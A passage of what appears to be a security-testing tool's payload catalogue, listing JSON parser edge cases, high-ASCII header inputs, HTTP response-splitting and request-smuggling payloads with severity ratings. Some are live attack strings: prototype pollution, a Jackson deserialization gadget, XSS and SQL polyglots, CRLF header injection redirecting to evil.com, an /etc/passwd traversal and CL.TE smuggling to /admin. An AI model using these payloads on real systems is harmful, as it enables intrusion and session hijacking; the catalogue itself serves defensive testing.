     multi-layered exploits (deep nesting, duplicate keys, polyglot, etc.). */
  tests: [
    /*   Basic String Encoding & Escapes   */
    { name: "Simple Key-Value",              description: "Well-formed object",                                                           payload: "{\"a\":\"1\"}",                                               severity: "low" },
    { name: "Escaped Quote",                 description: "Value with \\\" inside",                                                       payload: "{\"a\":\"in\\\"jection\"}",                                   severity: "medium" },
    { name: "Backslash Overflow",            description: "Many backslashes before quote",                                                payload: "{\"a\":\"\\\\\\\\\\\"end\"}",                                  severity: "medium" },
    { name: "Unicode Escape",                description: "U+2028 line separator in \\u notation",                                        payload: "{\"a\":\"\\u2028evil\"}",                                      severity: "high" },
    { name: "Bidi Override",                 description: "RLO \\u202E to mask .exe",                                                     payload: "{\"file\":\"cod\\u202Eexe\"}",                                 severity: "critical" },
    { name: "Zero-Width Space",              description: "U+200B inside key",                                                            payload: "{\"u\u200Bser\":\"admin\"}",                                   severity: "high" },
    { name: "Control Char 0x01",             description: "SOH in string literal",                                                        payload: "{\"a\":\"\\u0001\"}",                                         severity: "medium" },

    /*   Numbers & Numeric Edge-Cases   */
    { name: "Large 64-bit Int",              description: "Value exceeds 2^53-1",                                                         payload: "{\"num\":9007199254740993}",                                   severity: "high" },
    { name: "Negative Zero",                 description: "-0 literal",                                                                   payload: "{\"num\":-0}",                                                 severity: "medium" },
    { name: "Hex Float",                     description: "0x1p+2 (illegal in JSON)",                                                      payload: "{\"n\":0x1p+2}",                                              severity: "critical" },
    { name: "Infinity",                      description: "Infinity literal (non-standard)",                                              payload: "{\"v\":Infinity}",                                            severity: "critical" },
    { name: "NaN",                           description: "NaN literal",                                                                   payload: "{\"v\":NaN}",                                                 severity: "critical" },
    { name: "Exponential 1e309",             description: "Overflows double",                                                             payload: "{\"num\":1e309}",                                             severity: "high" },

    /*   Booleans, Null & Keywords   */
    { name: "Mixed-Case true",               description: "TRUE (upper case)",                                                             payload: "{\"ok\":TRUE}",                                               severity: "high" },
    { name: "Null in Quotes",                description: "\"null\" string vs null keyword confusion",                                    payload: "{\"token\":\"null\"}",                                        severity: "medium" },
    { name: "Keyword in Key",                description: "Key named \"true\"",                                                           payload: "{\"true\":false}",                                           severity: "low" },

    /*   Arrays & Nested Structures   */
    { name: "Deep Nesting x1000",            description: "1000 nested arrays - DoS",                                                     payload: "[".repeat(1000) + "]".repeat(1000),                            severity: "critical" },
    { name: "Empty Element Comma",           description: "Trailing comma inside array",                                                  payload: "[1,2,]",                                                     severity: "high" },
    { name: "Sparse Array",                  description: "Index holes [,,3]",                                                             payload: "[, , 3]",                                                    severity: "medium" },
    { name: "Mixed Types",                   description: "Number, object, string, bool",                                                 payload: "[42,{\"x\":1},\"str\",false]",                                severity: "low" },
    { name: "Multi-Dimensional",             description: "Array of arrays of objs",                                                      payload: "[[{\"a\":1}],[{\"b\":2}]]",                                   severity: "low" },

    /*   Duplicate Keys & Key Collisions   */
    { name: "Duplicate Keys Simple",         description: "{\"a\":1,\"a\":2}",                                                            payload: "{\"a\":1,\"a\":2}",                                           severity: "high" },
    { name: "Duplicate After Unicode",       description: "\"us\\u0065r\" vs \"user\"",                                                   payload: "{\"us\\u0065r\":1,\"user\":2}",                               severity: "high" },
    { name: "Confusable Keys",               description: "Latin a vs Cyrillic ",                                                        payload: "{\"p\u0430ss\":1,\"pass\":2}",                                severity: "high" },

    /*   Comment / Trailing Comma Exploits   */
    { name: "Line Comment //",               description: "Pseudo JS-style",                                                              payload: "{//comment\n\"a\":1}",                                        severity: "critical" },
    { name: "Block Comment /* */",           description: "C-style block",                                                                payload: "/*evil*/{\"a\":1}",                                          severity: "critical" },
    { name: "HTML Comment",                  description: "<!-- --> inside payload",                                                      payload: "<!--json-->{\"a\":1}",                                       severity: "critical" },
    { name: "Trailing Comma Object",         description: "{\"a\":1,}",                                                                   payload: "{\"a\":1,}",                                                 severity: "high" },

    /*   Invalid UTF-8 / Encoding Issues   */
    { name: "Overlong UTF-8 Slash",          description: "%C0%AF sequence inside string",                                                payload: "{\"p\":\"%C0%AFetc\"}",                                       severity: "critical" },
    { name: "Broken UTF-8 Continuation",     description: "0xC2 0x41",                                                                    payload: "{\"raw\":\"\\xC2A\"}",                                        severity: "critical" },
    { name: "Lone 0x80",                     description: "Bare continuation byte",                                                       payload: "{\"bad\":\"\\x80\"}",                                         severity: "critical" },

    /*   Unicode Normalization & Bidi Tricks   */
    { name: "NFD vs NFC ",                  description: " vs e\u0301 keys",                                                             payload: "{\"\":1,\"e\\u0301\":2}",                                    severity: "high" },
    { name: "RLO Wrapped Key",               description: "Key appears reversed",                                                         payload: "{\"\\u202Ecod\":\"1\"}",                                      severity: "critical" },

    /*   Property Name Attacks   */
    { name: "Null Byte in Key",              description: "Key contains \\u0000",                                                         payload: "{\"a\\u0000b\":1}",                                          severity: "high" },
    { name: "Leading Zero Number Key",       description: "\"01\" vs 1 collisions",                                                      payload: "{\"01\":1,\"1\":2}",                                         severity: "medium" },
    { name: "Numeric Key No Quotes",         description: "Unquoted 123:",                                                               payload: "{123:\"x\"}",                                                severity: "critical" },
    { name: "Whitespace in Key",             description: "\"a b\" spaced",                                                               payload: "{\"a b\":1}",                                                severity: "medium" },

    /*   Whitespace & Control Separation   */
    { name: "Tab Before Colon",              description: "\"a\" \t: 1",                                                                  payload: "{\"a\"\t:1}",                                                severity: "high" },
    { name: "Line Separator U+2028",         description: "Break object literal",                                                         payload: "{\"a\":1\u2028\"b\":2}",                                     severity: "critical" },
    { name: "Paragraph Separator U+2029",    description: "Another line-break char",                                                      payload: "{\"a\":1\u2029\"b\":2}",                                     severity: "critical" },

    /*   Special JSON-Polyglot / Script-Execution   */
    { name: "JS Callback Wrapper",           description: ")]}',\n prefix to break XSSI",                                                 payload: ")]}',\n{\"a\":1}",                                           severity: "high" },
    { name: "Array Prototype Pollute",       description: "{\"__proto__\":{\"polluted\":1}}",                                             payload: "{\"__proto__\":{\"polluted\":1}}",                            severity: "critical" },
    { name: "Constructor Pollute",           description: "{\"constructor\":{\"prototype\":{\"evil\":1}}}",                              payload: "{\"constructor\":{\"prototype\":{\"evil\":1}}}",             severity: "critical" },
    { name: "Set-Timeout Polyglot",          description: "\"};setTimeout(alert(1));//\"",                                                payload: "{\"x\":\"};setTimeout(alert(1));//\"}",                       severity: "critical" },

    /*   Control Pictures & U+2400 Block   */
    { name: "Symbol for NUL ",             description: " in string",                                                                   payload: "{\"ctl\":\"\"}",                                           severity: "medium" },
    { name: "Symbol for ETX ",             description: " char",                                                                        payload: "{\"ctl\":\"\"}",                                           severity: "medium" },

    /*   Multiline & CRLF Header Smuggling   */
    { name: "CRLF Inside String",            description: "\"evil\\r\\nSet-Cookie: hack=1\"",                                             payload: "{\"h\":\"evil\\r\\nSet-Cookie: hack=1\"}",                    severity: "critical" },
    { name: "Tab + LF",                      description: "Integrate HT + LF for log injection",                                          payload: "{\"log\":\"a\\t\\nadmin\"}",                                 severity: "high" },

    /*   JSON with BOM / Encoding Markers   */
    { name: "UTF-8 BOM Prefix",             description: "EF BB BF at start",                                                              payload: "\\uFEFF{\"a\":1}",                                          severity: "high" },
    { name: "UTF-16 LE BOM",                description: "FF FE encoded stream",                                                          payload: "\\xFF\\xFE{\\x00\"\"}",                                     severity: "critical" },

    /*   Geo / Date / Large Literal Edge Cases   */
    { name: "ISO Date Stinger",             description: "\"2025-12-31T23:59:60Z\" leap second",                                          payload: "{\"date\":\"2025-12-31T23:59:60Z\"}",                         severity: "medium" },
    { name: "Very Long String 1MB",         description: "1,048,576 'A's",                                                                 payload: "{\"blob\":\"" + "A".repeat(1048576) + "\"}",                  severity: "critical" },
    { name: "Extremely Deep Object",        description: "Depth 512 {a:{a:{...}}}",                                                        payload: "{\"a\":".repeat(512) + "0" + "}".repeat(512),                severity: "critical" },

    /*   Mixed Encoding Confusion   */
    { name: "UTF-7 Payload",                description: "+ADw-JSON+AD4-",                                                                 payload: "+ADw-123+AD4-",                                             severity: "high" },
    { name: "Base64 Embedded JSON",         description: "Base64 string that decodes to JSON",                                            payload: "{\"b64\":\"eyJhIjoxfQ==\"}",                                severity: "low" },
    { name: "Gzip Magic Bytes",             description: "Starts with 1F 8B",                                                              payload: "{\"gz\":\"\\u001F\\u008B\\b\"}",                            severity: "medium" },

    /*   Pathological Floating-Point   */
    { name: "Negative Infinity via -1e1000",description: "-1e1000",                                                                      payload: "{\"v\":-1e1000}",                                            severity: "high" },
    { name: "Smallest Denorm",              description: "5e-324",                                                                        payload: "{\"v\":5e-324}",                                             severity: "high" },

    /*   Property Order / Hash Collision Checks   */
    { name: "1000 Duplicate 'a' Keys",      description: "Stress parser property-overwrite",                                               payload: "{" + "\"a\":1,".repeat(999) + "\"a\":2}",                    severity: "critical" },

    /*   Escape Confusion Sequences   */
    { name: "Double Escaped Slash",         description: "\"\\\\/\" confusion around XSS filters",                                        payload: "{\"s\":\"\\\\/script>\"}",                                   severity: "high" },
    { name: "Newline Escape Backslash n",   description: "\"\\n\" vs actual newline",                                                     payload: "{\"nl\":\"\\n\"}",                                          severity: "medium" },
    { name: "Unicode Newline U+0085",       description: "Next line control",                                                             payload: "{\"ctl\":\"\\u0085\"}",                                      severity: "high" },

    /*   Misc Exotic Literals   */
    { name: "Single Quote Keys",            description: "Unquoted single-quotes { 'a':1 }",                                              payload: "{'a':1}",                                                   severity: "critical" },
    { name: "Key With Backtick",            description: "`a` key",                                                                       payload: "{\"`a`\":1}",                                               severity: "medium" },
    { name: "JSON5 Infinity",               description: "JSON5 non-std",                                                                 payload: "{infinity: -Infinity}",                                     severity: "critical" },

    /*   Comment Unicode Confusion   */
    { name: "Unicode Slash \u2215",         description: "DIVISION SLASH used for //",                                                    payload: "\u2215\u2215 comment\n{\"a\":1}",                            severity: "critical" },

    /*   Legacy Encodings   */
    { name: "Latin-1 Encoded Payload",      description: " appears due to wrong decode",                                                payload: "",                                                         severity: "high" },

    /*   Emoji & Supplementary Tests   */
    { name: "Supplementary Plane Key",      description: "Key = U+1F4A9 ()",                                                             payload: "{\"\":1}",                                                severity: "medium" },
    { name: "Emoji Comment",                description: "\"//\" inside string",                                                        payload: "{\"c\":\"//\"}",                                         severity: "low" },

    /*   CVE-Style Exploits   */
    { name: "Jackson XXE",                  description: "Polyglot triggering XML parse",                                                 payload: "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}", severity: "critical" },
    { name: "YAML Polyglot",                description: "\"--- !<tag:yaml.org,2002:js/function>\" inside JSON string",                   payload: "{\"y\":\"--- !<tag:yaml.org,2002:js/function> aler t(1)\"}",  severity: "critical" },

    /*   Heterogeneous Encapsulation   */
    { name: "JSON Inside Comment",          description: "/*{\"a\":1}*/ outside JSON",                                                    payload: "/*{\"a\":1}*/",                                             severity: "high" },
    { name: "JSON in HTML Script Tag",      description: "<script>var d=",                                                               payload: "<script>var data={\"a\":1}< /script>",                       severity: "low" },

    /*   Misc Super-Edge   */
    { name: "Object With 50k Keys",         description: "Generate 50,000 small keys",                                                    payload: "{" + Array.from({length:50000},(_,i)=>`\"k${i}\":${i}`).join(",") + "}", severity: "critical" },
    { name: "Array With Mixed Nulls",       description: "[null,\"null\",null]",                                                          payload: "[null,\"null\",null]",                                      severity: "low" },
    { name: "Garbage Binary",               description: "\"\\x00\\x01...\" 256 bytes raw",                                               payload: "{\"bin\":\"" + "\\u0000".repeat(256) + "\"}",               severity: "high" },
    { name: "Escaped Solidus",              description: "\"\\/\"",                                                                       payload: "{\"s\":\"\\/\"}",                                           severity: "low" },

    /*   Final Stress Mix   */
    { name: "Polyglot JSON/JS/SQL",         description: "Injected `\"};alert(1)//' OR 1=1 --`",                                        payload: "{\"x\":\"\\\"};alert(1)//' OR 1=1 --\"}",                   severity: "critical" },
    { name: "Whitespace Madness",           description: "Mix of NBSP, TAB, ZWSP between tokens",                                        payload: "{\u00A0\"a\"\u200B:\t1}",                                   severity: "medium" },
    { name: "Null Key Duplicate",           description: "\"\\u0000\" as key twice",                                                     payload: "{\"\\u0000\":1,\"\\u0000\":2}",                             severity: "high" },
    { name: "Surrogate Pair Broken",        description: "\"\\uD83D\" lone high surrogate",                                              payload: "{\"bad\":\"\\uD83D\"}",                                     severity: "critical" },
    { name: "Punycode IDN Inside String",   description: "\"xn--pple-43d.com\"",                                                          payload: "{\"url\":\"xn--pple-43d.com\"}",                            severity: "high" }
  ]
},



"High ASCII Characters": {
    "icon": "fa-keyboard",
    "tests": [
        {
            "name": "Extended ASCII Basic",
            "description": "Basic extended ASCII characters (128-255)",
            "payload": "X-Test: \\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F",
            "severity": "medium"
        },
        {
            "name": "Windows-1252 Special Chars",
            "description": "Common Windows-1252 special characters",
            "payload": "X-Test: \\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F",
            "severity": "medium"
        },
        {
            "name": "Euro Character Test",
            "description": "Euro currency symbol () at end",
            "payload": "X-Test: value\\x80",
            "severity": "low"
        },
        {
            "name": "Smart Quotes Injection",
            "description": "Smart quotes and apostrophes",
            "payload": "X-Test: \\x91left\\x92right\\x93left\\x94right\\x98apos",
            "severity": "low"
        },
        {
            "name": "En Dash/Em Dash",
            "description": "Dash characters injection",
            "payload": "X-Test: \\x96en-dash\\x97em-dash",
            "severity": "low"
        },
        {
            "name": "Trademark Symbols",
            "description": "TM and trademark symbols",
            "payload": "X-Test: \\x99TM\\x9Atrademark",
            "severity": "low"
        },
        {
            "name": "Non-Breaking Space",
            "description": "Non-breaking space (0xA0)",
            "payload": "X-Test: before\\xA0after",
            "severity": "low"
        },
        {
            "name": "Inverted Punctuation",
            "description": "Inverted punctuation marks",
            "payload": "X-Test: \\xA1\\xBF\\xAB\\xBB",
            "severity": "low"
        },
        {
            "name": "Currency Symbols",
            "description": "Various currency symbols",
            "payload": "X-Test: \\xA2\\xA3\\xA4\\xA5",
            "severity": "low"
        },
        {
            "name": "Broken Pipe Symbol",
            "description": "Broken pipe/vertical bar (0xA6)",
            "payload": "X-Test: \\xA6broken-pipe",
            "severity": "low"
        },
        {
            "name": "Section/Copyright",
            "description": "Section and copyright symbols",
            "payload": "X-Test: \\xA7\\xA9",
            "severity": "low"
        },
        {
            "name": "Feminine/Masculine Ordinal",
            "description": "Ordinal indicators",
            "payload": "X-Test: \\xAA\\xBA",
            "severity": "low"
        },
        {
            "name": "Degree Symbol",
            "description": "Degree symbol injection",
            "payload": "X-Test: 25\\xB0C",
            "severity": "low"
        },
        {
            "name": "Plus-Minus Symbol",
            "description": " symbol injection",
            "payload": "X-Test: \\xB1error-margin",
            "severity": "low"
        },
        {
            "name": "Superscript Numbers",
            "description": "Superscript digits",
            "payload": "X-Test: x\\xB2\\xB3\\xB9",
            "severity": "low"
        },
        {
            "name": "Micro/Mu Symbol",
            "description": "Micro sign () injection",
            "payload": "X-Test: 5\\xB5g",
            "severity": "low"
        },
        {
            "name": "Pilcrow/Paragraph Symbol",
            "description": "Paragraph mark ()",
            "payload": "X-Test: \\xB6paragraph",
            "severity": "low"
        },
        {
            "name": "Middle Dot",
            "description": "Middle dot () injection",
            "payload": "X-Test: item1\\xB7item2",
            "severity": "low"
        },
        {
            "name": "Cedilla Character",
            "description": "Cedilla () test",
            "payload": "X-Test: \\xB8cedilla",
            "severity": "low"
        },
        {
            "name": "Superscript 1/3",
            "description": "Superscript 1 and 3",
            "payload": "X-Test: \\xB9\\xBC\\xBD\\xBE",
            "severity": "low"
        },
        {
            "name": "AE Ligatures",
            "description": "/ ligatures",
            "payload": "X-Test: \\xC6\\xE6",
            "severity": "low"
        },
        {
            "name": "OE Ligatures",
            "description": "/ ligatures",
            "payload": "X-Test: \\x8C\\x9C",
            "severity": "low"
        },
        {
            "name": "Y with Diaeresis",
            "description": " character test",
            "payload": "X-Test: \\x9F",
            "severity": "low"
        },
        {
            "name": "German Sharp S",
            "description": " character test",
            "payload": "X-Test: Stra\\xDFe",
            "severity": "low"
        },
        {
            "name": "Scandinavian Letters",
            "description": "/, / characters",
            "payload": "X-Test: \\xC5\\xE5\\xD8\\xF8",
            "severity": "low"
        },
        {
            "name": "Full Extended ASCII",
            "description": "All high ASCII (128-255)",
            "payload": "X-Test: \\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F\\xA0\\xA1\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xAB\\xAC\\xAD\\xAE\\xAF\\xB0\\xB1\\xB2\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\\xBB\\xBC\\xBD\\xBE\\xBF\\xC0\\xC1\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xCB\\xCC\\xCD\\xCE\\xCF\\xD0\\xD1\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\\xDB\\xDC\\xDD\\xDE\\xDF\\xE0\\xE1\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\\xE9\\xEA\\xEB\\xEC\\xED\\xEE\\xEF\\xF0\\xF1\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFB\\xFC\\xFD\\xFE\\xFF",
            "severity": "medium"
        },
        {
            "name": "Mixed High ASCII",
            "description": "Mixed high ASCII characters",
            "payload": "X-Test: normal\\x80\\x91\\xA0\\xFFchars",
            "severity": "medium"
        },
        {
            "name": "High ASCII Boundary",
            "description": "Boundary high ASCII values",
            "payload": "X-Test: \\x7F\\x80\\xFF\\x00",
            "severity": "high"
        }, /*   Easy / Basic Single-Character Payloads   */
    {
      name: "NBSP Injection",
      description: "Non-breaking space (0xA0) as invisible splitter",
      payload: "X-Test: user\u00A0admin",
      severity: "low"
    },
    {
      name: "Soft Hyphen",
      description: "Soft hyphen (0xAD) hidden inside string",
      payload: "X-Test: re\u00ADplace",
      severity: "low"
    },
    {
      name: "Inverted Exclamation",
      description: " (0xA1) used in cookie name",
      payload: "Cookie: \u00A1admin=true",
      severity: "low"
    },
    {
      name: "Inverted Question",
      description: " (0xBF) in query parameter",
      payload: "/search?q=what\u00BFif",
      severity: "low"
    },
    {
      name: "Broken Bar",
      description: "Broken bar (0xA6) to split header values",
      payload: "X-Test: key\u00A6value",
      severity: "medium"
    },
    {
      name: "Section Sign",
      description: "Section sign (0xA7) marking boundaries",
      payload: "X-Test: start\u00A7stop",
      severity: "medium"
    },

    /*   Currency / Symbol Characters   */
    {
      name: "Currency Mix",
      description: "   (0xA2, 0xA3, 0xA5) bypass price filters",
      payload: "X-Price: \u00A2\u00A3\u00A5",
      severity: "low"
    },
    {
      name: "Copyright Symbol",
      description: " (0xA9) dropped into identifier",
      payload: "User-ID: ACME\u00A92025",
      severity: "low"
    },
    {
      name: "Registered Sign",
      description: " (0xAE) breaks token parsing",
      payload: "X-Flag: secure\u00AEfalse",
      severity: "low"
    },

    /*   Accented / Ligature Letters   */
    {
      name: "Capital  in Header",
      description: " (0xC9) confuses ASCII-only parsers",
      payload: "\u00C9-Header: value",
      severity: "high"
    },
    {
      name: "Lowercase  Username",
      description: "Sharp-s (0xDF) in basic-auth username",
      payload: "Authorization: Basic \u00DFadmin:pass",
      severity: "high"
    },
    {
      name: " Ligature",
      description: "Latin ligature oe (0x8C/0x9C) inside path",
      payload: "/api/v1/\u0152uvre",  //  U+0152 (UTF-8 C5 92)
      severity: "medium"
    },
    {
      name: "Accented Burst",
      description: "Burst of high-ASCII capitals 0xC00xDF",
      payload: "X-Test: \u00C0\u00C1\u00C2\u00C3\u00C4\u00C5\u00C6\u00C7\u00C8\u00C9",
      severity: "medium"
    },

    /*   C1 Control Range 0x800x9F (Often Mis-decoded)   */
    {
      name: "C1 Controls 809F",
      description: "Raw 0x800x9F bytes in header value",
      payload: "X-Test: \u0080\u0081\u0082\u0083\u0084\u0085\u0086\u0087\u0088\u0089\u008A\u008B\u008C\u008D\u008E\u008F\u0090\u0091\u0092\u0093\u0094\u0095\u0096\u0097\u0098\u0099\u009A\u009B\u009C\u009D\u009E\u009F",
      severity: "medium"
    },

    /*   Confusable & Homoglyph Attacks   */
    {
      name: "Cyrillic  vs Latin a",
      description: "Cyrillic small a (U+0430) masquerading as Latin",
      payload: "X-User: p\u0430ssword",  // first 'a' is Cyrillic
      severity: "high"
    },
    {
      name: "Greek  vs Latin u",
      description: "Greek mu (, 0xB5) in parameter key",
      payload: "/metrics?\u00B5ser=admin",
      severity: "medium"
    },

    /*   Mixed Encodings & Double-Encoding   */
    {
      name: "Percent-Encoded ",
      description: "Double-encoded %C3%89 in query",
      payload: "/login?name=%25C3%2589ric",  // literal %C3%89
      severity: "high"
    },
    {
      name: "Mixed Raw + Encoded",
      description: "Raw  plus %A9 together",
      payload: "/doc?mark=%A9\u00A9copy",
      severity: "high"
    },
    {
      name: "UTF-7 Encoded Tag",
      description: "UTF-7 sequence +ADw-script+AD4-",
      payload: "X-Test: +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
      severity: "critical"
    },
    {
      name: "Overlong UTF-8 NBSP",
      description: "Overlong 0xC0 0xA0 encoding of NBSP",
      payload: "X-Test: \u00C0\u00A0overlong",
      severity: "critical"
    },

    /*   Protocol Confusion   */
    {
      name: " Verb Tamper",
      description: "Replace 'A' with  in HTTP verb",
      payload: "UTH /index.html HTTP/1.1",
      severity: "high"
    },
    {
      name: " Directory Traversal",
      description: " in path to bypass filters",
      payload: "/..%2F\u00D8etc/passwd",
      severity: "high"
    },
    {
      name: "Latin-1 Line Fold",
      description: "Insert NBSP+LF to fold header",
      payload: "X-Test:\u00A0\nInjected",
      severity: "critical"
    },

    /*   Extended Punctuation & Math Symbols   */
    {
      name: "Multiplication Sign",
      description: " (0xD7) masks letter X",
      payload: "X-Test: value\u00D7inject",
      severity: "medium"
    },
    {
      name: "Division Sign",
      description: " (0xF7) in numeric header",
      payload: "Content-Length: 10\u00F73",
      severity: "low"
    },

    /*   Multi-Character Stress Tests   */
    {
      name: "High ASCII Burst",
      description: "Random mix: NBSP, , , , , , ",
      payload: "X-Test: \u00A0\u00A9\u00DF\u00B5\u00D8\u00F7\u00FF",
      severity: "medium"
    },
    {
      name: "Latin-1 Full Range",
      description: "Every byte 0xA00xFF once",
      payload: "X-Test: \u00A0\u00A1\u00A2\u00A3\u00A4\u00A5\u00A6\u00A7\u00A8\u00A9\u00AA\u00AB\u00AC\u00AD\u00AE\u00AF\u00B0\u00B1\u00B2\u00B3\u00B4\u00B5\u00B6\u00B7\u00B8\u00B9\u00BA\u00BB\u00BC\u00BD\u00BE\u00BF\u00C0\u00C1\u00C2\u00C3\u00C4\u00C5\u00C6\u00C7\u00C8\u00C9\u00CA\u00CB\u00CC\u00CD\u00CE\u00CF\u00D0\u00D1\u00D2\u00D3\u00D4\u00D5\u00D6\u00D7\u00D8\u00D9\u00DA\u00DB\u00DC\u00DD\u00DE\u00DF\u00E0\u00E1\u00E2\u00E3\u00E4\u00E5\u00E6\u00E7\u00E8\u00E9\u00EA\u00EB\u00EC\u00ED\u00EE\u00EF\u00F0\u00F1\u00F2\u00F3\u00F4\u00F5\u00F6\u00F7\u00F8\u00F9\u00FA\u00FB\u00FC\u00FD\u00FE\u00FF",
      severity: "medium"
    },
    {
      name: "Combined Control + High ASCII",
      description: "CRLF + NBSP + C1 + raw  mix",
      payload: "X-Test: \r\n\u00A0\u0085\u00DF\r\n",
      severity: "critical"
    }

    ]
},
    "HTTP Response Splitting": {
        icon: "fa-code-branch",
        tests: [
            {
                name: "Double CRLF Body Injection",
                description: "Inject response body with double CRLF",
                payload: 'X-Test: value\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)< /script>',
                severity: "critical"
            },
            {
                name: "Set-Cookie Injection",
                description: "Inject session cookies",
                payload: 'X-Test: value\\r\\nSet-Cookie: sessionid=admin; HttpOnly',
                severity: "critical"
            },
            {
                name: "Location Header Injection",
                description: "Redirect to malicious site",
                payload: 'X-Test: value\\r\\nLocation: https://evil.com',
                severity: "critical"
            },
            {
                name: "Content-Type Override",
                description: "Change response content type",
                payload: 'X-Test: value\\r\\nContent-Type: text/html',
                severity: "high"
            },
            {
                name: "Cache-Control Injection",
                description: "Manipulate caching behavior",
                payload: 'X-Test: value\\r\\nCache-Control: public, max-age=31536000',
                severity: "high"
            },
            {
                name: "CORS Header Injection",
                description: "Inject CORS headers",
                payload: 'X-Test: value\\r\\nAccess-Control-Allow-Origin: *',
                severity: "high"
            },
            {
                name: "X-XSS-Protection Disable",
                description: "Disable XSS protection",
                payload: 'X-Test: value\\r\\nX-XSS-Protection: 0',
                severity: "medium"
            },
            {
                name: "CSP Header Injection",
                description: "Inject Content Security Policy",
                payload: 'X-Test: value\\r\\nContent-Security-Policy: default-src *',
                severity: "high"
            },
            {
                name: "X-Frame-Options Override",
                description: "Allow framing attacks",
                payload: 'X-Test: value\\r\\nX-Frame-Options: ALLOWALL',
                severity: "high"
            },
            {
                name: "Strict-Transport-Security",
                description: "Disable HSTS",
                payload: 'X-Test: value\\r\\nStrict-Transport-Security: max-age=0',
                severity: "high"
            },
            {
                name: "Content-Disposition",
                description: "Force file download",
                payload: 'X-Test: value\\r\\nContent-Disposition: attachment; filename="malware.exe"',
                severity: "medium"
            },
            {
                name: "Refresh Header",
                description: "Auto-redirect via refresh",
                payload: 'X-Test: value\\r\\nRefresh: 0; url=https://evil.com',
                severity: "high"
            },
            {
                name: "Link Header Injection",
                description: "Inject prefetch links",
                payload: 'X-Test: value\\r\\nLink: <https://evil.com/malware>; rel="prefetch"',
                severity: "medium"
            },
            {
                name: "Content-Length Manipulation",
                description: "Response truncation",
                payload: 'X-Test: value\\r\\nContent-Length: 0',
                severity: "high"
            },
            {
                name: "Transfer-Encoding Injection",
                description: "Chunked encoding manipulation",
                payload: 'X-Test: value\\r\\nTransfer-Encoding: chunked',
                severity: "high"
            },
            {
                name: "WWW-Authenticate",
                description: "Fake authentication prompt",
                payload: 'X-Test: value\\r\\nWWW-Authenticate: Basic realm="Fake Login"',
                severity: "medium"
            },
            {
                name: "Access-Control-Allow-Credentials",
                description: "CORS credential theft",
                payload: 'X-Test: value\\r\\nAccess-Control-Allow-Credentials: true',
                severity: "high"
            },
            {
                name: "X-Content-Type-Options",
                description: "Disable MIME sniffing protection",
                payload: 'X-Test: value\\r\\nX-Content-Type-Options: nosniff',
                severity: "medium"
            },
            {
                name: "Feature-Policy",
                description: "Inject feature policy",
                payload: 'X-Test: value\\r\\nFeature-Policy: camera *; microphone *',
                severity: "medium"
            },
            {
                name: "Clear-Site-Data",
                description: "Clear user data",
                payload: 'X-Test: value\\r\\nClear-Site-Data: "*"',
                severity: "high"
            },
            {
                name: "Content-Security-Policy-Report-Only",
                description: "CSP report injection",
                payload: 'X-Test: value\\r\\nContent-Security-Policy-Report-Only: default-src *; report-uri https://evil.com',
                severity: "medium"
            },
            {
                name: "X-DNS-Prefetch-Control",
                description: "DNS prefetch manipulation",
                payload: 'X-Test: value\\r\\nX-DNS-Prefetch-Control: on',
                severity: "low"
            },
            {
                name: "X-Download-Options",
                description: "Download options manipulation",
                payload: 'X-Test: value\\r\\nX-Download-Options: open',
                severity: "low"
            },
            {
                name: "X-Permitted-Cross-Domain-Policies",
                description: "Flash crossdomain policy",
                payload: 'X-Test: value\\r\\nX-Permitted-Cross-Domain-Policies: all',
                severity: "medium"
            },
            {
                name: "Public-Key-Pins",
                description: "HPKP manipulation",
                payload: 'X-Test: value\\r\\nPublic-Key-Pins: max-age=0',
                severity: "high"
            },
            {
                name: "Expect-CT",
                description: "Certificate transparency bypass",
                payload: 'X-Test: value\\r\\nExpect-CT: max-age=0',
                severity: "medium"
            },
            {
                name: "Report-To",
                description: "Reporting endpoint injection",
                payload: 'X-Test: value\\r\\nReport-To: {"endpoints":[{"url":"https://evil.com"}]}',
                severity: "medium"
            },
            {
                name: "NEL Header",
                description: "Network Error Logging injection",
                payload: 'X-Test: value\\r\\nNEL: {"report_to":"evil","max_age":31536000}',
                severity: "medium"
            },
            {
                name: "Cross-Origin-Opener-Policy",
                description: "COOP manipulation",
                payload: 'X-Test: value\\r\\nCross-Origin-Opener-Policy: unsafe-none',
                severity: "medium"
            },
            {
                name: "Cross-Origin-Embedder-Policy",
                description: "COEP manipulation",
                payload: 'X-Test: value\\r\\nCross-Origin-Embedder-Policy: unsafe-none',
                severity: "medium"
            }
        ]
    },
    "Request Smuggling": {
        icon: "fa-exchange-alt",
        tests: [
            {
                name: "CL.TE Smuggling",
                description: "Content-Length vs Transfer-Encoding",
                payload: 'Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n',
                severity: "critical"
            },
            {
                name: "TE.CL Smuggling",
                description: "Transfer-Encoding vs Content-Length",
                payload: 'Transfer-Encoding: chunked\\r\\nContent-Length: 100\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n',
                severity: "critical"
            },
            {
                name: "TE.TE Obfuscation",
                description: "Double Transfer-Encoding",
                payload: 'Transfer-Encoding: chunked\\r\\nTransfer-encoding: cow',
                severity: "critical"
            },
            {
                name: "HTTP/2 Downgrade",
                description: "Force HTTP/1.1 from HTTP/2",
                payload: ':method: GET\\r\\n:path: /admin\\r\\n:scheme: https',
                severity: "high"
            },
            {
